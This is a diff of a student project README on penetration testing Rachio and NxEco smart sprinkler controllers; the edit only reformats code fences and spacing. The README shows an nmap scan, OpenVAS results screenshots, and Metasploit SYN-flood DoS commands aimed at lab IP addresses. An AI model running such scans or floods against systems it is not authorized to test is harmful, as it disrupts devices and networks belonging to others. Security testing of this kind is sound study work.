@@ -36,29 +36,36 @@ In our Penetration testing, we compared Rachio with NxEco, another popular smart
 Here are the implementations.
 
 **Port Scanning**
-- Metasploit Nmap
+- Metasploit Nmap  
 
-'''
+
+```
 root@kali:~# nmap -v -sV -oA port_scanning 192.168.1.0/29
-'''
+```
 
 - Results  
-NxEco
+
+NxEco  
+
 ![nxeco_scan](https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco_scan.png?raw=true)
 
-Rachio
+Rachio  
+
 ![rachio_scan](https://github.com/ffrqw/ECE209AS/blob/master/images/rachio_scan.png?raw=true)
 
 **Vulunrablity Analysis**
 - OpenVAS
 
 - Results  
-NxEco
+
+NxEco  
+
 ![nxeco_edit](https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco_edit.png?raw=true)
 
 ![nxeco_results](https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco.png?raw=true)
 
-Rachio
+Rachio  
+
 ![rachio_edit](https://github.com/ffrqw/ECE209AS/blob/master/images/rachio_edit.png?raw=true)
 
 ![rachio_results](https://github.com/ffrqw/ECE209AS/blob/master/images/rachio.png?raw=true)
@@ -67,12 +74,12 @@ Rachio
 **DoS Attack**
 - Metasploit auxiliary module attack
 
-'''
+```
 msf > use auxiliary/dos/tcp/synflood 
 msf auxiliary(dos/tcp/synflood) > set RHOST 192.168.1.9
 RHOST => 192.168.1.9
 msf auxiliary(dos/tcp/synflood) > run
-'''
+```
 -Results  
 
 NxEco
